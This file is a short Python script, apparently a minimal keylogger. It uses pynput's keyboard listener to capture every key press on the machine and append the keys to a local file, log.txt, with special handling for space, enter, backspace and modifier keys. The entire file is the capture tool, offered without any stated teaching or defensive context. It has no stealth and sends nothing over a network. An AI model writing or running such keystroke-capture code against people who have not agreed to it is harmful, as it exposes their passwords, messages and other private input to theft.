from pynput.keyboard import Listener


def writer(key):
    letter = str(key).replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    elif letter in ['Key.shift_r', 'Key.shift_l', 'Key.ctrl_l', 'Key.ctrl_r']:
        letter = ''
    elif letter == "Key.backspace":
        with open("log.txt", 'rb+') as f:
            f.seek(-1, 2)
            f.truncate()
        return
    elif letter == "Key.enter":
        letter = "\n"

    with open("log.txt", 'a') as f:
        f.write(letter)



with Listener(on_press=writer) as l:
    l.join()

